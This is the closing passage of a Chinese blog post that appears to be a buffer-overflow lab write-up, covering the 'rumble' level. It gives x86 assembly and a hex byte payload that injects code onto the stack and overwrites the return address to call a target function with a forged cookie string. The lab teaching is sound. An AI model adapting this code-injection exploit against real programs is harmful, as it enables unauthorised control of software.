+这说明需要输入一个长度为<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex" xmlns="http://www.w3.org/2000/svg" width="1.131ex" height="1.557ex" role="img" focusable="false" viewBox="0 -666 500 688"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path></g></g></g></svg></mjx-container></span>的字符串,
+而且以大写16进制格式书写. 知道了这个之后就好办了.
+因为<code>eval2equal</code>函数总是会使用传入的<code>char*</code>和<code>cookie</code>进行比较,
+因此只需要在代码中预先改变这个字符串的值,
+然后再跳转到<code>rumble</code>让它顺序执行就好了. 为了做到这一点,
+首先随便挑选一个寄存器, 将它的值变为字符串的首地址,
+然后向这个地址内写入我们需要的字符串对应的数字, 然后再向这个地址<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex" xmlns="http://www.w3.org/2000/svg" width="2.891ex" height="1.717ex" role="img" focusable="false" viewBox="0 -677 1278 759"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(778,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g></svg></mjx-container></span>的位置写入剩余的数字,
+最后将这个寄存器的值入栈就完成了参数的准备. 接下来,
+将目标函数的地址入栈并跳转即可. 依据这个思路写出的汇编如下.</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">movl <span class="number">$0</span>x804d2e8, %ecx</span><br><span class="line">movl <span class="number">$0</span>x35313134, (%ecx)</span><br><span class="line">movl <span class="number">$0</span>x46313336, <span class="number">0x4</span>(%ecx)</span><br><span class="line">pushl %ecx</span><br><span class="line">subl <span class="number">$0</span>x4, %esp</span><br><span class="line">pushl <span class="number">$0</span>x0804954d</span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure>
+<p>接下来和上一部分基本相同, 将它转为机器码, 并用0填补剩下的部分,
+以及覆盖返回值地址使其跳转到缓冲区开头. 最终过关代码如下.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">b9 e8 d2 04 </span><br><span class="line">08 c7 01 34 </span><br><span class="line">31 31 35 c7 </span><br><span class="line">41 04 36 33 </span><br><span class="line">31 46 51 83 </span><br><span class="line">ec 04 68 4d </span><br><span class="line">95 04 08 c3             /* 28 bytes of good code */</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">4c b5 68 55</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/11/05/%E6%8C%A3%E6%89%8E%E9%A2%98%E8%A7%A3/%E7%A7%BB%E9%99%A4%E6%9C%80%E5%A4%9A%E7%9A%84%E5%90%8C%E8%A1%8C%E6%88%96%E5%90%8C%E5%88%97%E7%9F%B3%E5%A4%B4/" rel="prev" title="移除最多的同行或同列石头">
+      <i class="fa fa-chevron-left"></i> 移除最多的同行或同列石头
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/03/05/%E6%A2%A6%E9%97%B4%E5%89%A7/%E6%AD%BB%E7%81%B5%E9%AD%94%E6%B3%95/" rel="next" title="死灵魔法">
+      死灵魔法 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%A7%E4%BD%93%E6%84%9F%E6%83%B3"><span class="nav-number">1.</span> <span class="nav-text">大体感想</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%A6%E4%B8%80%E4%B8%AA%E9%87%8D%E8%A6%81%E7%9A%84%E5%B8%B8%E8%AF%86"><span class="nav-number">1.1.</span> <span class="nav-text">另一个重要的常识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#smoke"><span class="nav-number">1.2.</span> <span class="nav-text">Smoke</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fizz"><span class="nav-number">1.3.</span> <span class="nav-text">Fizz</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bang"><span class="nav-number">1.4.</span> <span class="nav-text">Bang</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rumble"><span class="nav-number">1.5.</span> <span class="nav-text">Rumble</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ushio"
+      src="/images/roll.jpg">
+  <p class="site-author-name" itemprop="name">Ushio</p>
+  <div class="site-description" itemprop="description">吐黑泥的地方🤗</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/UshioA" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;UshioA" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:shiosshio@outlook.com" title="E-Mail → mailto:shiosshio@outlook.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ushio</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+</body>
+</html>
